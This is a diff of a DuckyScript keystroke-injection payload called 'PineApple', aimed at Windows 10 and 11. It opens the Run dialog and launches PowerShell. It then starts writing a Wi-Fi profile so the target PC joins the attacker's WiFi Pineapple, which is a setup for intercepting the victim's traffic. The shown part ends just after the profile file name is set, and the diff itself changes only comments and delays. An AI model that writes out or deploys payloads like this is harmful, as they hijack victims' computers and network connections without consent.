@@ -1,16 +1,21 @@
 
-REM Title: RD-PineApple
-REM Description: This payload is meant to use powershell to add the network profile of your wifi pineapple to the targets PC and connect to it
-REM Author: I am Jakoby
-REM Target: Windows 10, 11
+REM     Title: PineApple
+REM     Description: This payload is meant to use powershell to add the network profile of your wifi pineapple to the targets PC and connect to it
+REM     This version is a direct key stroke injection attack
+REM     Author: I am Jakoby
+REM     Target: Windows 10, 11
 
 DELAY 1000
+
+REM     If the wifi pineapple SSID is detected target PC will connect to it  
 
 GUI r 
 DELAY 500
 STRING powershell
 DELAY 500
 ENTER
+
+DELAY 1000
 
 STRING $profilefile="Home.xml";
 SHIFT ENTER
